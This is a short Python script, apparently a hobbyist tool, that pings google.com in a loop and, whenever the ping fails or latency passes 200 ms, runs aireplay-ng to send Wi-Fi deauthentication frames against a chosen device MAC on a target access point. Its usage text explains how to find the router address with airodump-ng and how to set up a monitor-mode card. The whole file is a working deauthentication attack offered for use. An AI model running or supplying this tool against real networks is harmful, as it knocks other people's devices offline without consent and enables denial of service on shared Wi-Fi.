#/usr/bin/python3

#Created_by: Code_Chief

import subprocess, sys

def pinger():
    return subprocess.run(['ping', '-c 1', 'www.google.com'], stdout=subprocess.PIPE).stdout.decode('utf-8')

def airmon():
    subprocess.call(['aireplay-ng','-a',bssid,'-c',dmac,'-0','5',interface])

def main():
    try:
        while True:
            lista = pinger()
            print(lista)
            try:
                i = int(lista.index('time=')) + 5
            except ValueError:
                airmon()
                print("Disconnect !")
                continue
            temp = ''
            while(lista[i] != ' '):
                temp += lista[i]
                i += 1
            if (float(temp) > float(200)):
                airmon()
                print("Disconnect !")
            else:
                print("Ping less than 200 ms")
    except KeyboardInterrupt:
        print("Quit !")

if __name__ == "__main__":
    if (len(sys.argv) == 4):
        global bssid
        bssid = str(sys.argv[1])
        global dmac
        dmac = str(sys.argv[2])
        global interface
        interface = str(sys.argv[3])
        main()
    else:
        print("Usage: prog.py [bssid] [dmac] [interface]\n\nbssid --> find in airodump-ng (router address)\ndmac --> mac of device\ninterface --> interface of your monitor-mode wifi card (in my case 'wlan1mon')\n")
        print("Monitor mode wifi card required !, first set up your card into monitor mode !")
